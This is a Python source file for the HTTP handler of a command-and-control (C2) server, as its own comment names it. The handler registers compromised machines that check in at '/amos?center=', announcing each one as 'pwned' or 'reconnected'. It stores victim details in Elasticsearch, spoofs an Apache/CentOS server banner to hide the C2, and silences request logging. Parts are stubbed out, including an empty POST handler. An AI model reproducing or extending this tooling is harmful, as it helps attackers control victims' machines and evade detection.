from http.server import BaseHTTPRequestHandler
from server_settings import ES_HANDLER


class MyHandler(BaseHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        # Initialize instance variables
        self.connected_clients = {}  # Store connected clients with their unique IDs
        self.current_client_ip = None  # Variable to hold the current client IP after using 'select' command
        self.cmd_request = "/amos?center="

        # Call the parent class initializer with the given arguments
        super().__init__(*args, **kwargs)

    # Make our c2 server look like an up-to-date Apache server on CentOS
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"


    @staticmethod
    def convert_text(text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m" 
            return f"{BOLD}{COLOR}{text}{RESET}"


    """Sends the HTTP response code and headers back to the client"""
    def server_response(self, code: int):
        self.send_response(code)
        self.end_headers()


    def do_GET(self):
        try:
            if self.path.startswith(self.cmd_request):
                # Split out the client from the HTTP GET request
                client = self.path.split(self.cmd_request)[1]
                client_account = client.split('@')[0]
                client_hostname = client.split('@')[1]

                print("checking.....")
                if client not in self.connected_clients.values() and not ES_HANDLER.is_client_present(client):
                    self.server_response(200)
                    print(f"{client_account}@{client_hostname} has been pwned!\n")

                elif ES_HANDLER.is_client_present(client):
                    # Sends the HTTP response code and header back to the client
                    self.server_response(200)
                    print(f"{client_account}@{client_hostname} has reconnected!\n")

                else:
                    self.server_response(400)

        except Exception as e:
            print("[-]Unable to complete get request!!!")
            print(e)


    # handle post requests
    def do_POST(self):
        try:
            pass
        except Exception as e:
            print(e)


    def save_file(self, file_path: str, content):
        try:
            with open(file_path, 'wb') as file:
                file.write(content)
            print(f'File saved successfully at {file_path}')
        except Exception as e:
            print(f'Error saving file: {e}')


    def client_info_handler(self, mac_address, client_info):
        #check if client is present
        if ES_HANDLER.is_client_present(mac_address):
            ES_HANDLER.update_document(mac_address, client_info)
        else:
            ES_HANDLER.store_client_information(client_info)
       

    def get_client_id(self, client_ip: str):
        # Get the client ID based on the client's IP address
        if client_ip in self.connected_clients:
            return self.connected_clients[client_ip]
        else:
            # If the client is not in the connected_clients dictionary, generate a new ID
            new_client_id = len(self.connected_clients) + 1
            self.connected_clients[client_ip] = new_client_id
            return new_client_id


    def get_client_ip(self, client_id: int, esHandler):
        try:
            resp = esHandler.es.get(index=esHandler.db_name, id=client_id)
            return resp["_source"]["ip"]
        except Exception as e:
            print(f"An error occurred: {e}")


    def log_request(self, code="-", size="-"):
        """Override BaseHTTPRequestHandler's log_request"""
        return

